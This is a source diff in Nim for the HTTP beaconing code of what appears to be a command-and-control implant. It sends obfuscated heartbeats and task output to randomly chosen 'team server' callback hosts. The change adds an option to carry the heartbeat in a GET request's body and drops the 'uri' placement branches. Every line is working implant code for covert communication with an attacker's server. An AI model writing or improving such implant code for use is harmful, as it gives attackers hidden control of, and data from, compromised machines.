@@ -29,6 +29,7 @@ proc httpGet*(ctx: AgentCtx, heartbeat: seq[byte]): string =
         prefix = ctx.profile.getString(protect("http-get.agent.heartbeat.prefix"))
         suffix = ctx.profile.getString(protect("http-get.agent.heartbeat.suffix"))
         payload = prefix & heartbeatString & suffix
+    var body = ""
 
     # Add heartbeat packet to the request
     case ctx.profile.getString(protect("http-get.agent.heartbeat.placement.type")): 
@@ -37,10 +38,8 @@ proc httpGet*(ctx: AgentCtx, heartbeat: seq[byte]): string =
     of protect("query"):
         let param = ctx.profile.getString(protect("http-get.agent.heartbeat.placement.name"))
         endpoint &= fmt"{param}={payload}&"
-    of protect("uri"):
-        discard
     of protect("body"): 
-        discard
+        body = payload
     else:
         discard 
 
@@ -53,7 +52,7 @@ proc httpGet*(ctx: AgentCtx, heartbeat: seq[byte]): string =
         # Select random callback host
         let hosts = ctx.hosts.split(";")
         let host = hosts[rand(hosts.len() - 1)]
-        let response = waitFor client.get(fmt"http://{host}/{endpoint[0..^2]}")
+        let response = waitFor client.request(fmt"http://{host}/{endpoint[0..^2]}", HttpGet, body)
 
         # Check the HTTP status code to determine whether the agent needs to re-register to the team server
         if response.code == Http404: 
@@ -124,8 +123,6 @@ proc httpPost*(ctx: AgentCtx, data: seq[byte]): bool {.discardable.} =
     of protect("query"):
         let param = ctx.profile.getString(protect("http-post.agent.output.placement.name"))
         endpoint &= fmt"{param}={payload}&"
-    of protect("uri"):
-        discard
     of protect("body"): 
         body = payload  # Set the request body to the "prefix & task output & suffix" construct
     else:
